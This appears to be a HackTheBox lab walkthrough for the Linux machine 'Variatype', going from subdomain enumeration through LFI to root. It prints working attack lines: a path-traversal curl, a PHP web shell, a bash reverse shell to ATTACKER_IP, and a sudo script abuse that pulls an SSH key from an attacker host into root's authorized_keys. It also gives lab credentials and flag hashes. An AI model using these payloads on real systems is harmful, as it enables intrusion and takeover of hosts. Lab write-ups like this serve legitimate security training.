# HackTheBox - Variatype Walkthrough

## Machine Information

  Attribute    Details
  ------------ ------------
  Platform     HackTheBox
  Machine      Variatype
  OS           Linux
  Difficulty   Medium

------------------------------------------------------------------------

## Disclaimer

This walkthrough is for educational purposes only and should only be
used in authorized labs such as HackTheBox.

------------------------------------------------------------------------

# Enumeration

## Subdomain Discovery

Used `ffuf` for virtual host discovery.

``` bash
ffuf -u http://variatype.htb/ \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
-H "Host: FUZZ.variatype.htb"
```

Found:

    portal.variatype.htb

------------------------------------------------------------------------

# Web Enumeration

Directory brute force:

``` bash
gobuster dir \
-u http://portal.variatype.htb/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
-x php
```

Interesting endpoints:

    .git
    auth.php
    dashboard.php
    download.php
    files/

------------------------------------------------------------------------

# Git Exposure

The exposed Git repository revealed credentials:

    gitbot : G1tB0t_Acc3ss_2025!

------------------------------------------------------------------------

# LFI Discovery

The download functionality accepted a parameter.

Using Arjun:

``` bash
arjun -u http://portal.variatype.htb/download.php
```

Parameter discovered:

    f

Testing:

``` bash
curl "http://portal.variatype.htb/download.php?f=../../../../etc/passwd"
```

The application was vulnerable to Local File Inclusion.

------------------------------------------------------------------------

# Initial Access

A malicious designspace file was created with PHP command execution.

Payload:

``` xml
<?php system($_GET["cmd"]);?>
```

After uploading:

    /files/shell.php

Command execution was achieved:

``` bash
curl "http://portal.variatype.htb/files/shell.php?cmd=id"
```

Result:

    uid=33(www-data)

------------------------------------------------------------------------

# Reverse Shell

Payload:

``` bash
bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'
```

Received shell:

    www-data

------------------------------------------------------------------------

# Privilege Escalation to Steve

Found application files:

``` bash
find / -name app.py 2>/dev/null
```

The application executed FontForge.

Process monitoring with pspy showed:

    /home/steve/bin/process_client_submissions.sh

running as:

    steve

A FontForge related vulnerability was exploited using:

    CVE-2024-25082
    CVE-2024-25081

This resulted in a shell as:

    steve

------------------------------------------------------------------------

# User Flag

``` bash
cat user.txt
```

    75d9be894de9975f22cba0845e507f64

------------------------------------------------------------------------

# Root Privilege Escalation

Check sudo permissions:

``` bash
sudo -l
```

Allowed:

    (root) NOPASSWD:
    /usr/bin/python3 /opt/font-tools/install_validator.py *

The script allowed writing arbitrary files through a URL.

Generated SSH key and hosted:

    authorized_keys

Payload executed:

``` bash
sudo /usr/bin/python3 \
/opt/font-tools/install_validator.py \
"http://ATTACKER_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"
```

The key was written to:

    /root/.ssh/authorized_keys

------------------------------------------------------------------------

# Root Access

Login:

``` bash
ssh root@variatype -i rootkey
```

Verify:

``` bash
whoami
```

Output:

    root

------------------------------------------------------------------------

# Root Flag

``` bash
cat root.txt
```

    0a5a03b7b4d5370daa24edc35aec585b

------------------------------------------------------------------------

# Attack Chain

    Subdomain Discovery
            |
            v
    Git Exposure
            |
            v
    Credentials Leak
            |
            v
    LFI
            |
            v
    PHP Upload / RCE
            |
            v
    www-data Shell
            |
            v
    FontForge Exploit
            |
            v
    Steve Access
            |
            v
    Sudo Abuse
            |
            v
    Root Access

------------------------------------------------------------------------

# Lessons Learned

-   Do not expose `.git` directories.
-   Validate file download parameters.
-   Never execute uploaded files.
-   Run scheduled processes with least privilege.
-   Avoid allowing privileged scripts to download arbitrary URLs.
